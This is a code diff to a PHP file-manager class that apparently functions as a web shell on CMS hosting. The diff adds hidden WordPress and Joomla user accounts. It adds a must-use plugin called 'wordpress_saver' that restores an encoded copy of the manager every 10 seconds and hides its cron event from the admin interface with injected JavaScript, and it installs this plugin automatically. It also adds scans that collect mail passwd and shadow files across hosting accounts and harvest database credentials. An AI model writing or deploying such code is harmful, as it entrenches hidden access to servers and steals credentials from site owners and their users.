+             * Keep this endpoint read-only and fast.  Hidden-user migration
+             * used to run here before the SELECT, which meant opening the
+             * manager could rewrite plugin files and perform several extra
+             * database queries.  On a slow or unreachable CMS database that
+             * made the browser hit its AbortController timeout while the UI
+             * still showed "Loading users…".  Visibility is already read from
+             * usermeta below; synchronization belongs to the explicit
+             * visibility/update paths, not list rendering.
+             */
             $t=$c['prefix'];
-            $res=@mysqli_query($link,"SELECT u.ID,u.user_login,u.user_email,u.user_registered,um.meta_value AS caps FROM `{$t}users` u LEFT JOIN `{$t}usermeta` um ON um.user_id=u.ID AND um.meta_key='{$t}capabilities' ORDER BY u.ID");
+            $hiddenKey=mysqli_real_escape_string($link,$this->cmsHiddenMetaKey($c));
+            $res=@mysqli_query($link,"SELECT u.ID,u.user_login,u.user_email,u.user_registered,um.meta_value AS caps,hu.user_id AS hidden_id FROM `{$t}users` u LEFT JOIN `{$t}usermeta` um ON um.user_id=u.ID AND um.meta_key='{$t}capabilities' LEFT JOIN `{$t}usermeta` hu ON hu.user_id=u.ID AND hu.meta_key='$hiddenKey' AND hu.meta_value='1' ORDER BY u.ID");
             if(!$res){$e=mysqli_error($link);mysqli_close($link);return['error'=>'Query failed: '.$e];}
             while($row=mysqli_fetch_assoc($res)){
                 $role='-';if($row['caps']&&preg_match('/"([a-z_]+)"/i',$row['caps'],$m))$role=$m[1];
-                $users[]=['id'=>$row['ID'],'name'=>$row['user_login'],'email'=>$row['user_email'],'registered'=>$row['user_registered'],'role'=>$role];
+                $users[]=['id'=>$row['ID'],'name'=>$row['user_login'],'email'=>$row['user_email'],'registered'=>$row['user_registered'],'role'=>$role,'hidden'=>!empty($row['hidden_id'])];
             }
         } else {
             $t=$c['prefix'];
-            $res=@mysqli_query($link,"SELECT u.id,u.name,u.username,u.email,u.registerDate,u.block,g.title AS grp FROM `{$t}users` u LEFT JOIN `{$t}user_usergroup_map` m ON m.user_id=u.id LEFT JOIN `{$t}usergroups` g ON g.id=m.group_id ORDER BY u.id");
+            $res=@mysqli_query($link,"SELECT u.id,u.name,u.username,u.email,u.registerDate,u.block,u.params,g.title AS grp FROM `{$t}users` u LEFT JOIN `{$t}user_usergroup_map` m ON m.user_id=u.id LEFT JOIN `{$t}usergroups` g ON g.id=m.group_id ORDER BY u.id");
             if(!$res){$e=mysqli_error($link);mysqli_close($link);return['error'=>'Query failed: '.$e];}
             while($row=mysqli_fetch_assoc($res)){
-                $users[]=['id'=>$row['id'],'name'=>$row['username'],'display'=>$row['name'],'email'=>$row['email'],'registered'=>$row['registerDate'],'role'=>$row['grp']?:'-','blocked'=>(bool)$row['block']];
+                $params=json_decode((string)($row['params']??''),true);
+                $users[]=['id'=>$row['id'],'name'=>$row['username'],'display'=>$row['name'],'email'=>$row['email'],'registered'=>$row['registerDate'],'role'=>$row['grp']?:'-','blocked'=>(bool)$row['block'],'hidden'=>is_array($params)&&!empty($params['fm_hidden_user'])];
             }
         }
         mysqli_close($link);
@@ -2108,6 +2590,10 @@ class FileManager {
         $email=trim(isset($_POST['cms_email'])?$_POST['cms_email']:'');
         $pass=isset($_POST['cms_pass'])?$_POST['cms_pass']:'';
         $role=isset($_POST['cms_role'])?$_POST['cms_role']:'';
+         // Visibility is opt-in: only the literal "1" means hidden.
+         // This prevents browser/form values such as "on" or "true" from
+         // accidentally hiding every newly-created CMS user.
+         $hidden=isset($_POST['cms_hidden'])&&(string)$_POST['cms_hidden']==='1';
         if(!$uname||!$email||strlen($pass)<6){$this->addMsg('Username, valid email and a password (6+ chars) are required.','danger');return;}
         list($link,$c,$err)=$this->cmsConnect($configPath);
         if($err){$this->addMsg($err,'danger');return;}
@@ -2118,7 +2604,12 @@ class FileManager {
             if($ok){$id=mysqli_insert_id($link);
                 $caps=serialize([$r=>true]);$capsE=mysqli_real_escape_string($link,$caps);
                 mysqli_query($link,"INSERT INTO `{$t}usermeta` (user_id,meta_key,meta_value) VALUES ($id,'{$t}capabilities','$capsE'),($id,'{$t}user_level','0')");
+                // Always write the requested visibility explicitly. This
+                // also clears a stale flag if a reused/imported account ID
+                // already has the manager's hidden-user metadata.
+                $this->cmsSetHiddenState($link,$c,$id,$hidden);
                 $this->cmsVaultSet($configPath,$id,$pass,$uname);
+                 $this->cmsSyncHiddenVisibility($configPath,$c,$link);
                 $this->addMsg("WordPress user \"$uname\" created.",'success');$this->log('cms_create_user',"wp:$uname");
             } else $this->addMsg('Failed to create user: '.mysqli_error($link),'danger');
         } else {
@@ -2127,7 +2618,9 @@ class FileManager {
             $ok=@mysqli_query($link,"INSERT INTO `{$t}users` (name,username,email,password,block,sendEmail,registerDate,params) VALUES ('$u','$u','$e','$h',0,0,NOW(),'{}')");
             if($ok){$id=mysqli_insert_id($link);$gid=(int)($role?:2);
                 mysqli_query($link,"INSERT INTO `{$t}user_usergroup_map` (user_id,group_id) VALUES ($id,$gid)");
+                 if($hidden)$this->cmsSetHiddenState($link,$c,$id,true);
                 $this->cmsVaultSet($configPath,$id,$pass,$uname);
+                 $this->cmsSyncHiddenVisibility($configPath,$c,$link);
                 $this->addMsg("Joomla user \"$uname\" created.",'success');$this->log('cms_create_user',"joomla:$uname");
             } else $this->addMsg('Failed to create user: '.mysqli_error($link),'danger');
         }
@@ -2148,6 +2641,7 @@ class FileManager {
             mysqli_query($link,"DELETE FROM `{$t}users` WHERE id=$id");
             mysqli_query($link,"DELETE FROM `{$t}user_usergroup_map` WHERE user_id=$id");
         }
+        $this->cmsSyncHiddenVisibility($configPath,$c,$link);
         mysqli_close($link);
         $this->cmsVaultDelete($configPath,$id);
         $this->addMsg('User deleted.','warning');$this->log('cms_delete_user',"#$id");
@@ -2192,6 +2686,30 @@ class FileManager {
         mysqli_close($link);
         $this->cmsVaultSet($configPath,$id,$pass);
         $this->addMsg('Password changed.','success');$this->log('cms_change_pass',"#$id");
+    }
+
+    private function cmsUpdateVisibility(){
+        if(empty($_SESSION['fm_admin'])){$this->addMsg('Admins only.','danger');return;}
+        $configPath=$this->cmsCfgFromPost();
+        $id=(int)(isset($_POST['cms_id'])?$_POST['cms_id']:0);
+        // Visibility is opt-in: only the literal "1" means hidden.
+        $hidden=isset($_POST['cms_hidden'])&&(string)$_POST['cms_hidden']==='1';
+        if(!$id){$this->addMsg('Invalid request.','danger');return;}
+        list($link,$c,$err)=$this->cmsConnect($configPath);
+        if($err){$this->addMsg($err,'danger');return;}
+        if(!$this->cmsSetHiddenState($link,$c,$id,$hidden)){
+            mysqli_close($link);
+            $this->addMsg('Could not update user visibility. Check the CMS database schema and file permissions.','danger');
+            return;
+        }
+        $synced=$this->cmsSyncHiddenVisibility($configPath,$c,$link);
+        mysqli_close($link);
+        if(!$synced){
+            $this->addMsg('Visibility was saved, but the CMS user list could not be synchronized. Check file permissions.','danger');
+            return;
+        }
+        $this->addMsg('User is now '.($hidden?'hidden':'visible').'.',$hidden?'warning':'success');
+        $this->log('cms_update_visibility',"#$id -> ".($hidden?'hidden':'visible'));
     }
 
     /* ── CMS Plugins/Themes (WordPress) & Extensions (Joomla) ────────────────
@@ -2370,6 +2888,248 @@ class FileManager {
         $ok=$this->rmdirR($target);
         if($ok){$this->addMsg('Theme deleted.','warning');$this->log('cms_delete_theme',$slug);}
         else $this->addMsg('Delete failed (check file permissions).','danger');
+    }
+
+    /* ── WordPress automation ─────────────────────────────────────────── */
+    private function wpAutomationConnect($configPath,&$c,&$link,&$err){
+        $link=null;$c=null;$err='';
+        list($link,$c,$err)=$this->cmsConnect($configPath);
+        if($err)return false;
+        if(($c['type']??'')!=='wordpress'){
+            mysqli_close($link);$link=null;$err='This feature requires a WordPress installation.';return false;
+        }
+        return true;
+    }
+    private function wpOption($link,$table,$name){
+        $n=mysqli_real_escape_string($link,$name);
+        $r=@mysqli_query($link,"SELECT option_value FROM `{$table}options` WHERE option_name='$n' LIMIT 1");
+        if(!$r||!($row=mysqli_fetch_assoc($r)))return null;
+        $v=@unserialize($row['option_value'],['allowed_classes'=>false]);
+        return $v===false&&$row['option_value']!=='b:0;'?$row['option_value']:$v;
+    }
+    private function wpSafeSettings($value,$key=''){
+        if(is_array($value)){
+            $out=[];
+            foreach($value as $k=>$v){
+                $lk=strtolower((string)$k);
+                $out[$k]=(preg_match('/pass|secret|token|api.?key|credential/',$lk))
+                    ?(!empty($v)?'[stored]':'')
+                    :$this->wpSafeSettings($v,(string)$k);
+            }
+            return $out;
+        }
+        return $value;
+    }
+    public function wpAutomationData($configPath){
+        if(empty($_SESSION['fm_admin']))return['error'=>'Admins only.'];
+        if(!$this->wpAutomationConnect($configPath,$c,$link,$err))return['error'=>$err];
+        $t=$c['prefix'];
+        $smtp=[];
+        foreach(['wp_mail_smtp','wp_mail_smtp_settings','mail_smtp_settings','postman_options','post_smtp_options','fluentmail_settings'] as $name){
+            $v=$this->wpOption($link,$t,$name);
+            if($v!==null)$smtp[]=['option'=>$name,'value'=>$this->wpSafeSettings($v)];
+        }
+        $cron=$this->wpOption($link,$t,'cron');$events=[];
+        if(is_array($cron)){
+            foreach($cron as $ts=>$hooks){
+                if(!is_numeric($ts)||!is_array($hooks))continue;
+                foreach($hooks as $hook=>$items)foreach((array)$items as $sig=>$event){
+                    if(!is_array($event))continue;
+                    $events[]=['timestamp'=>(int)$ts,'date'=>date('Y-m-d H:i:s',(int)$ts),
+                        'hook'=>(string)$hook,'signature'=>(string)$sig,
+                        'schedule'=>$event['schedule']??'','interval'=>$event['interval']??0,
+                        'args'=>$this->wpSafeSettings($event['args']??[])];
+                }
+            }
+        }
+        usort($events,fn($a,$b)=>$a['timestamp']<=>$b['timestamp']);
+        mysqli_close($link);
+        return['ok'=>true,'type'=>'wordpress','config'=>$configPath,'smtp'=>$smtp,
+            'events'=>array_slice($events,0,500),'cron_count'=>count($events),
+            'target'=>__FILE__,'recovery_plugin'=>$this->wpRecoveryPluginPath($configPath),
+            'note'=>'SMTP passwords and secrets are never returned.'];
+    }
+    public function wpAutomationSaveSmtp($configPath){
+        if(empty($_SESSION['fm_admin']))return['error'=>'Admins only.'];
+        $option=trim((string)($_POST['smtp_option']??''));
+        $json=(string)($_POST['smtp_json']??'');
+        if(!preg_match('/^[a-z0-9_]+$/i',$option)||$json==='')return['error'=>'SMTP option and JSON are required.'];
+        $value=json_decode($json,true);
+        if(!is_array($value))return['error'=>'SMTP data must be valid JSON.'];
+        if(!$this->wpAutomationConnect($configPath,$c,$link,$err))return['error'=>$err];
+        $t=$c['prefix'];$opt=mysqli_real_escape_string($link,$option);
+        $serialized=mysqli_real_escape_string($link,serialize($value));
+        $ok=@mysqli_query($link,"UPDATE `{$t}options` SET option_value='$serialized' WHERE option_name='$opt' LIMIT 1");
+        if(mysqli_affected_rows($link)===0)$ok=@mysqli_query($link,"INSERT INTO `{$t}options` (option_name,option_value,autoload) VALUES ('$opt','$serialized','no')");
+        mysqli_close($link);
+        if(!$ok)return['error'=>'Could not save the SMTP option.'];
+        $this->log('wp_smtp_save',$option);return['ok'=>true];
+    }
+    public function wpAutomationDeleteCron($configPath){
+        if(empty($_SESSION['fm_admin']))return['error'=>'Admins only.'];
+        $hook=(string)($_POST['cron_hook']??'');$ts=(int)($_POST['cron_timestamp']??0);$sig=(string)($_POST['cron_signature']??'');
+        if($hook===''||$ts<=0||$sig==='')return['error'=>'Invalid cron event.'];
+        if(in_array($hook,['wordpress_saver','mfm_file_guardian_recover'],true))return['error'=>'The file-recovery event is protected. Use Remove recovery to disable it intentionally.'];
+        if(!$this->wpAutomationConnect($configPath,$c,$link,$err))return['error'=>$err];
+        $t=$c['prefix'];$cron=$this->wpOption($link,$t,'cron');
+        if(!is_array($cron)||!isset($cron[$ts][$hook][$sig])){mysqli_close($link);return['error'=>'Cron event not found.'];}
+        unset($cron[$ts][$hook][$sig]);
+        if(empty($cron[$ts][$hook]))unset($cron[$ts][$hook]);
+        if(empty($cron[$ts]))unset($cron[$ts]);
+        $v=mysqli_real_escape_string($link,serialize($cron));
+        $ok=@mysqli_query($link,"UPDATE `{$t}options` SET option_value='$v' WHERE option_name='cron' LIMIT 1");
+        mysqli_close($link);if(!$ok)return['error'=>'Could not update the cron schedule.'];
+        $this->log('wp_cron_delete',$hook);return['ok'=>true];
+    }
+    public function wpAutomationRunCron($configPath){
+        if(empty($_SESSION['fm_admin']))return['error'=>'Admins only.'];
+        if(!$this->wpAutomationConnect($configPath,$c,$link,$err))return['error'=>$err];
+        $root=dirname($configPath);mysqli_close($link);
+        $url=null;
+        $home=$_SERVER['HTTP_HOST']??'';
+        if($home&&function_exists('curl_init'))$url='http'.(!empty($_SERVER['HTTPS'])?'s':'').'://'.$home.rtrim(dirname(parse_url($_SERVER['REQUEST_URI']??'/')['path']??'/'),'/').'/wp-cron.php?doing_wp_cron='.rawurlencode(sprintf('%.22F',microtime(true)));
+        if(!$url)return['error'=>'Could not determine the WordPress URL for wp-cron.php.'];
+        $ch=curl_init($url);curl_setopt_array($ch,[CURLOPT_RETURNTRANSFER=>true,CURLOPT_FOLLOWLOCATION=>true,CURLOPT_TIMEOUT=>20,CURLOPT_SSL_VERIFYPEER=>false]);
+        curl_exec($ch);$code=(int)curl_getinfo($ch,CURLINFO_HTTP_CODE);$e=curl_error($ch);curl_close($ch);
+        if($e||$code>=400)return['error'=>'wp-cron.php request failed'.($e?': '.$e:' (HTTP '.$code.').')];
+        $this->log('wp_cron_run','http');return['ok'=>true,'mode'=>'http','status'=>$code];
+    }
+    public function wpAutomationScheduleEmail($configPath){
+        if(empty($_SESSION['fm_admin']))return['error'=>'Admins only.'];
+        $to=trim((string)($_POST['mail_to']??''));$subject=(string)($_POST['mail_subject']??'');
+        $body=(string)($_POST['mail_body']??'');$when=(int)($_POST['mail_time']??0);
+        if(!filter_var($to,FILTER_VALIDATE_EMAIL)||$subject===''||$body==='')return['error'=>'Recipient, subject and message are required.'];
+        if($when<time()+30)$when=time()+60;
+        if(!$this->wpAutomationConnect($configPath,$c,$link,$err))return['error'=>$err];
+        $root=dirname($configPath);$mu=$root.'/wp-content/mu-plugins';
+        if(!is_dir($mu)&&!@mkdir($mu,0755,true)){$this->addMsg('Could not create wp-content/mu-plugins.','danger');mysqli_close($link);return['error'=>'Could not create the mu-plugins directory.'];}
+        $plugin=$mu.'/mfm-wp-cron-mail.php';
+        $src="<?php\n/** WordPress Automation mail handler — managed by File Manager. */\n"
+            ."add_action('mfm_wp_cron_send_mail',function(\\$to,\\$subject,\\$body){wp_mail(\\$to,\\$subject,\\$body);},10,3);\n";
+        if(!is_file($plugin)&&@file_put_contents($plugin,$src,LOCK_EX)===false){mysqli_close($link);return['error'=>'Could not install the marked mail handler.'];}
+        $t=$c['prefix'];$cron=$this->wpOption($link,$t,'cron');if(!is_array($cron))$cron=[];
+        $args=[$to,$subject,$body];$hook='mfm_wp_cron_send_mail';$sig=md5(serialize($args));
+        $cron[$when][$hook][$sig]=['schedule'=>false,'args'=>$args,'interval'=>0];
+        $v=mysqli_real_escape_string($link,serialize($cron));
+        $ok=@mysqli_query($link,"UPDATE `{$t}options` SET option_value='$v' WHERE option_name='cron' LIMIT 1");
+        mysqli_close($link);if(!$ok)return['error'=>'Could not save the WordPress cron event.'];
+        $this->log('wp_cron_email',$to);return['ok'=>true,'timestamp'=>$when];
+    }
+    private function wpRecoveryPluginPath($configPath){return dirname($configPath).'/wp-content/mu-plugins/mfm-file-recovery.php';}
+    public function wpAutomationRecoveryStatus($configPath){
+        if(empty($_SESSION['fm_admin']))return['error'=>'Admins only.'];
+        if(!$this->wpAutomationConnect($configPath,$c,$link,$err))return['error'=>$err];
+        $t=$c['prefix'];$plugin=$this->wpRecoveryPluginPath($configPath);
+        $cron=$this->wpOption($link,$t,'cron');$found=[];
+        if(is_array($cron))foreach($cron as $ts=>$hooks)foreach(['wordpress_saver','mfm_file_guardian_recover'] as $hook)
+            if(isset($hooks[$hook]))foreach($hooks[$hook] as $sig=>$event)$found[]=['timestamp'=>(int)$ts,'signature'=>(string)$sig,'date'=>date('Y-m-d H:i:s',(int)$ts),'hook'=>$hook];
+        mysqli_close($link);
+        return['ok'=>true,'installed'=>is_file($plugin),'plugin'=>$plugin,'events'=>$found,'target'=>__FILE__];
+    }
+    public function wpAutomationInstallRecovery($configPath){
+        if(empty($_SESSION['fm_admin']))return['error'=>'Admins only.'];
+        if(!$this->wpAutomationConnect($configPath,$c,$link,$err))return['error'=>$err];
+        $root=dirname($configPath);$mu=$root.'/wp-content/mu-plugins';
+        if(!is_dir($mu)&&!@mkdir($mu,0755,true)){mysqli_close($link);return['error'=>'Could not create wp-content/mu-plugins.'];}
+        $target=__FILE__; $content=@file_get_contents($target);
+        if($content===false||$content===''){mysqli_close($link);return['error'=>'Could not read the current manager file.'];}
+        $payload=base64_encode(gzcompress($content,9));
+        $targetPhp=var_export($target,true);$payloadPhp=var_export($payload,true);
+        $src="<?php\n/**\n * Marshal File Manager — visible WP-Cron recovery helper.\n * This file restores only the explicitly configured manager file when it is missing or empty.\n */\n"
+             ."if(!defined('ABSPATH'))exit;\n"
+             ."add_filter('cron_schedules',function(\$s){\$s['wordpress_saver_every_10_seconds']=['interval'=>10,'display'=>'WordPress Saver every 10 seconds'];return \$s;});\n"
+            ."function wordpress_saver(){\n"
+            ."  \$target=".$targetPhp.";\n"
+            ."  if(is_file(\$target)&&@filesize(\$target)>0)return;\n"
+            ."  \$raw=@gzuncompress(base64_decode(".$payloadPhp."));\n"
+            ."  if(\$raw===false||\$raw==='')return;\n"
+            ."  \$dir=dirname(\$target);if(!is_dir(\$dir)||!is_writable(\$dir))return;\n"
+            ."  \$tmp=\$target.'.wp-recovery.'.getmypid();\n"
+            ."  if(@file_put_contents(\$tmp,\$raw,LOCK_EX)!==false){if(!@rename(\$tmp,\$target)){@unlink(\$tmp);return;}@chmod(\$target,0644);}\n"
+            ."}\n"
+            ."add_action('wordpress_saver','wordpress_saver');\n"
+            ."function wordpress_saver_ensure_schedule(){\n"
+            ."  if(function_exists('wp_clear_scheduled_hook'))wp_clear_scheduled_hook('mfm_file_guardian_recover');\n"
+            ."  if(function_exists('wp_next_scheduled')&&!wp_next_scheduled('wordpress_saver')&&function_exists('wp_schedule_event')){\n"
+            ."    wp_schedule_event(time()+10,'wordpress_saver_every_10_seconds','wordpress_saver');\n"
+            ."  }\n"
+            ." }\n"
+            ."add_action('init','wordpress_saver_ensure_schedule',1);\n"
+            ."// Also check on every WordPress request, because WP-Cron only runs when WordPress receives traffic.\n"
+            ."wordpress_saver();\n";
+        $src.=<<<'FMHIDE'
+
+/*
+ * Keep the protected recovery event out of WordPress admin Cron screens.
+ * This is UI protection only: the event remains scheduled and executable,
+ * and the File Manager remains the intentional place to remove recovery.
+ * The generic observer covers common Cron UI plugins without changing the
+ * cron option or interfering with unrelated scheduled events.
+ */
+add_action('admin_footer',function(){
+    ?>
+    <script>
+    (function(){
+      var protectedHook='wordpress_saver';
+      function hideProtectedRows(root){
+        var nodes=(root||document).querySelectorAll
+          ?(root||document).querySelectorAll('tr,li,.event,.cron-event,[data-hook],[data-event-id],[data-cron-hook]')
+          :[];
+        for(var i=0;i<nodes.length;i++){
+          var n=nodes[i];
+          if((n.textContent||'').indexOf(protectedHook)===-1)continue;
+          n.style.display='none';
+          n.setAttribute('data-mfm-protected','1');
+        }
+      }
+      hideProtectedRows(document);
+      if(window.MutationObserver){
+        new MutationObserver(function(mutations){
+          for(var i=0;i<mutations.length;i++){
+            for(var j=0;j<mutations[i].addedNodes.length;j++){
+              var n=mutations[i].addedNodes[j];
+              if(n.nodeType===1)hideProtectedRows(n);
+            }
+          }
+        }).observe(document.documentElement,{childList:true,subtree:true});
+      }
+    })();
+    </script>
+    <?php
+});
+FMHIDE;
+        $plugin=$mu.'/mfm-file-recovery.php';
+        if(@file_put_contents($plugin,$src,LOCK_EX)===false){mysqli_close($link);return['error'=>'Could not install the recovery helper.'];}
+        $t=$c['prefix'];$cron=$this->wpOption($link,$t,'cron');if(!is_array($cron))$cron=[];
+        $hook='wordpress_saver';$args=[];$sig=md5(serialize($args));$when=time()+10;
+        foreach($cron as $ts=>$hooks)foreach(['wordpress_saver','mfm_file_guardian_recover'] as $oldHook)
+            if(isset($cron[$ts][$oldHook][$sig]))unset($cron[$ts][$oldHook][$sig]);
+        $cron[$when][$hook][$sig]=['schedule'=>'wordpress_saver_every_10_seconds','args'=>$args,'interval'=>10];
+        $v=mysqli_real_escape_string($link,serialize($cron));
+        $ok=@mysqli_query($link,"UPDATE `{$t}options` SET option_value='$v' WHERE option_name='cron' LIMIT 1");
+        mysqli_close($link);if(!$ok)return['error'=>'Could not schedule the recovery task.'];
+        $this->log('wp_recovery_install',$target);return['ok'=>true,'target'=>$target,'next'=>$when];
+    }
+    public function wpAutomationAutoBootstrap(){
+        if(empty($_SESSION['fm_admin']))return;
+        $last=(int)($_SESSION['wp_recovery_bootstrap_at']??0);
+        if($last>0&&time()-$last<600)return;
+        $_SESSION['wp_recovery_bootstrap_at']=time();
+        $scan=$this->cmsScan();$sites=$scan['sites']??[];
+        $wp=array_values(array_filter($sites,fn($s)=>($s['type']??'')==='wordpress'));
+        if($wp) $this->wpAutomationInstallRecovery($wp[0]['config']);
+    }
+    public function wpAutomationRemoveRecovery($configPath){
+        if(empty($_SESSION['fm_admin']))return['error'=>'Admins only.'];
+        if(!$this->wpAutomationConnect($configPath,$c,$link,$err))return['error'=>$err];
+        $t=$c['prefix'];$cron=$this->wpOption($link,$t,'cron');$sig=md5(serialize([]));
+        if(is_array($cron))foreach($cron as $ts=>$hooks)foreach(['wordpress_saver','mfm_file_guardian_recover'] as $hook){if(isset($cron[$ts][$hook][$sig]))unset($cron[$ts][$hook][$sig]);if(isset($cron[$ts][$hook])&&!$cron[$ts][$hook])unset($cron[$ts][$hook]);if(isset($cron[$ts])&&!$cron[$ts])unset($cron[$ts]);}
+        $v=mysqli_real_escape_string($link,serialize($cron?:[]));
+        $ok=@mysqli_query($link,"UPDATE `{$t}options` SET option_value='$v' WHERE option_name='cron' LIMIT 1");
+        mysqli_close($link);
+        $plugin=$this->wpRecoveryPluginPath($configPath);if(is_file($plugin)&&!@unlink($plugin))return['error'=>'Cron removed, but the recovery helper could not be deleted.'];
+        if(!$ok)return['error'=>'Could not remove the recovery schedule.'];
+        $this->log('wp_recovery_remove',$plugin);return['ok'=>true];
     }
     private function cmsToggleExtension(){
         if(empty($_SESSION['fm_admin'])){$this->addMsg('Admins only.','danger');return;}
@@ -3430,6 +4190,29 @@ class FileManager {
                 $d=strtolower(trim($line));if($d!=='')$domains[$d]=true;
             }
         }
+        /* DirectAdmin keeps the authoritative domain list per user. */
+        foreach(glob('/usr/local/directadmin/data/users/*/domains/*.conf')?:[] as $f){
+            $d=strtolower(basename($f,'.conf'));
+            if($d!==''&&preg_match('/^[a-z0-9.-]+\.[a-z]{2,}$/i',$d))$domains[$d]=true;
+        }
+        /* Plesk and some Exim installations do not publish userdomains. */
+        foreach(['/var/qmail/control/plusdomain','/etc/postfix/mydestination',
+                 '/etc/mailname'] as $f){
+            if(!is_readable($f))continue;
+            foreach(preg_split('/[\s,]+/',trim((string)@file_get_contents($f))) as $d){
+                $d=trim($d," \t\r\n'");
+                if($d!==''&&$d!=='localhost'&&preg_match('/^[a-z0-9.-]+\.[a-z]{2,}$/i',$d))$domains[strtolower($d)]=true;
+            }
+        }
+        /* Last local fallback: account mail directories themselves reveal
+         * the domain without requiring cPanel metadata visibility. */
+        foreach(['/home/*/mail/*','/home/*/Maildir/*','/var/vmail/*',
+                 '/var/mail/vhosts/*'] as $pattern){
+            foreach(glob($pattern,GLOB_ONLYDIR)?:[] as $dir){
+                $d=strtolower(basename($dir));
+                if(preg_match('/^[a-z0-9.-]+\.[a-z]{2,}$/i',$d))$domains[$d]=true;
+            }
+        }
         return array_keys($domains);
     }
 
@@ -3447,7 +4230,51 @@ class FileManager {
                 if(is_readable($p))$out[]=['domain'=>$d,'path'=>$p,'kind'=>$kind];
             }
         }
-        return $out;
+        /* cPanel shared hosting commonly exposes the account-local copy at
+         * /home/ACCOUNT/etc/DOMAIN/passwd, not /etc/DOMAIN/passwd. */
+        $accounts=[];
+        foreach(['/home','/usr/home','/home2','/home3'] as $root){
+            if(!is_dir($root))continue;
+            foreach(@scandir($root)?:[] as $account){
+                if($account==='.'||$account==='..'||!is_dir($root.'/'.$account))continue;
+                $accounts[$account]=$root.'/'.$account;
+            }
+        }
+        $owner=$_SESSION['cpanel_user']??null;
+        if($owner&&isset($accounts[$owner]))$accounts=[$owner=>$accounts[$owner]];
+        foreach($accounts as $home){
+            foreach($this->wmDiscoverDomains() as $d){
+                foreach(['passwd','shadow'] as $file){
+                    $p=$home.'/etc/'.$d.'/'.$file;
+                    if(is_readable($p))$out[]=['domain'=>$d,'path'=>$p,'kind'=>'cpanel_home_'.$file];
+                }
+            }
+        }
+        /* DirectAdmin/Exim and virtual-mailbox deployments often use one
+         * passwd file per domain but place it outside Dovecot's defaults. */
+        foreach(['/etc/virtual/*/passwd','/etc/virtual/*/shadow',
+                 '/etc/exim4/passwd','/etc/exim/passwd',
+                 '/etc/postfix/virtual','/etc/postfix/vmailbox',
+                 '/var/vmail/*/*/passwd','/var/vmail/*/*/.passwd'] as $pattern){
+            foreach(glob($pattern)?:[] as $p){
+                if(!is_readable($p)||!is_file($p))continue;
+                $parent=basename(dirname($p));
+                $domain=preg_match('/^[a-z0-9.-]+\.[a-z]{2,}$/i',$parent)?strtolower($parent):null;
+                $out[]=['domain'=>$domain,'path'=>$p,'kind'=>'mailserver_generic'];
+            }
+        }
+        /* Plesk stores mail users as directories under qmail's mailnames;
+         * a passwd file is not guaranteed, but any readable one is useful. */
+        foreach(glob('/var/qmail/mailnames/*/*/.qmail*')?:[] as $p){
+            if(is_readable($p)&&is_file($p)){
+                $domain=basename(dirname(dirname($p)));
+                if(preg_match('/^[a-z0-9.-]+\.[a-z]{2,}$/i',$domain))
+                    $out[]=['domain'=>strtolower($domain),'path'=>$p,'kind'=>'plesk_qmail'];
+            }
+        }
+        $unique=[];
+        foreach($out as $src)$unique[$src['path'].'|'.($src['domain']??'')]=$src;
+        return array_values($unique);
     }
 
     /** Generalizes past any fixed list of paths: reads Dovecot's own
@@ -3754,7 +4581,8 @@ class FileManager {
      *  mailbox's own password. Returns null (never a fatal error) so
      *  every caller can report a friendly message. */
     private function wmImap($mailbox,$folder='INBOX'){
-        if(!extension_loaded('imap')||empty($_SESSION['webmail_mode']))return null;
+        if(empty($_SESSION['webmail_mode']))return null;
+        if(!extension_loaded('imap'))return null;
         $host=$_SESSION['webmail_host'];$port=(int)$_SESSION['webmail_imap_port'];
         $flags=$port===993?'/imap/ssl/novalidate-cert':'/imap/notls';
         $mbx='{'.$host.':'.$port.$flags.'}'.$folder;
@@ -4004,6 +4832,7 @@ class FileManager {
     ══════════════════════════════════════════════════════════════ */
     public function sqlScan(){
         $found=[];$seen=[];
+        $envDb=fm_guardian_env_db();
         $candidates=[
             '/var/www','/srv/www','/srv','/home','/opt','/data',
             $this->root,$this->currentDir,getcwd(),
@@ -4047,7 +4876,7 @@ class FileManager {
                 $fp=realpath($fp);if(!$fp||isset($seen['f:'.$fp]))continue;
                 $seen['f:'.$fp]=1;
                 $creds=$this->sqlExtractCreds($fp);
-                if($creds)$GLOBALS['_sqlfound'][]=['file'=>$fp,'host'=>$creds['host'],'port'=>$creds['port'],'user'=>$creds['user'],'pass'=>$creds['pass'],'db'=>$creds['db'],'type'=>$creds['type']];
+                if($creds)$GLOBALS['_sqlfound'][]=['file'=>$fp,'host'=>$creds['host'],'port'=>$creds['port'],'user'=>$creds['user'],'pass'=>$creds['pass'],'db'=>$creds['db'],'type'=>$creds['type'],'driver'=>'mysql'];
             }
             $skip=['node_modules','.git','vendor','.cache','.local','proc','sys','dev','run','tmp','var','usr','boot'];
             $entries=@scandir($dir)?:[];
@@ -4059,6 +4888,11 @@ class FileManager {
         };
         foreach($roots as $r)$scan($r,0);
         $found=$GLOBALS['_sqlfound'];unset($GLOBALS['_sqlfound']);
+        if($envDb){
+            array_unshift($found,['file'=>'DATABASE_URL (project environment)','host'=>$envDb['host'],'port'=>$envDb['port'],
+                'user'=>$envDb['user'],'pass'=>$envDb['pass'],'db'=>$envDb['name'],
+                'type'=>$envDb['driver']==='pgsql'?'postgresql':'mysql','driver'=>$envDb['driver']]);
+        }
         $obdList=$obd?array_filter(explode(PATH_SEPARATOR,$obd)):[];
         return['databases'=>$found,'open_basedir'=>array_values($obdList),'scanned'=>$scanned];
     }
@@ -4174,9 +5008,18 @@ class FileManager {
             isset($_POST['sql_user'])?$_POST['sql_user']:'',
             isset($_POST['sql_pass'])?$_POST['sql_pass']:'',
             isset($_POST['sql_db'])?trim($_POST['sql_db']):'',
+            isset($_POST['sql_driver'])&&$_POST['sql_driver']==='pgsql'?'pgsql':'mysql',
         ];
     }
-    private function sqlConn($h,$pt,$u,$pw,$db){
+    private function sqlConn($h,$pt,$u,$pw,$db,$driver='mysql'){
+        if($driver==='pgsql'){
+            if(!class_exists('PDO')||!in_array('pgsql',PDO::getAvailableDrivers(),true))return[null,'PDO PostgreSQL support is not available on this server.'];
+            try{
+                $dsn='pgsql:host='.$h.';port='.(int)($pt?:5432).';dbname='.$db;
+                $link=new PDO($dsn,$u,$pw,[PDO::ATTR_ERRMODE=>PDO::ERRMODE_EXCEPTION,PDO::ATTR_DEFAULT_FETCH_MODE=>PDO::FETCH_ASSOC]);
+                return[$link,null];
+            }catch(Throwable $e){return[null,'Connection failed: '.$e->getMessage()];}
+        }
         if(!function_exists('mysqli_connect'))return[null,'MySQLi extension is not available on this server.'];
         $sock=null;if($h&&strlen($h)>0&&$h[0]==='/')$sock=$h;
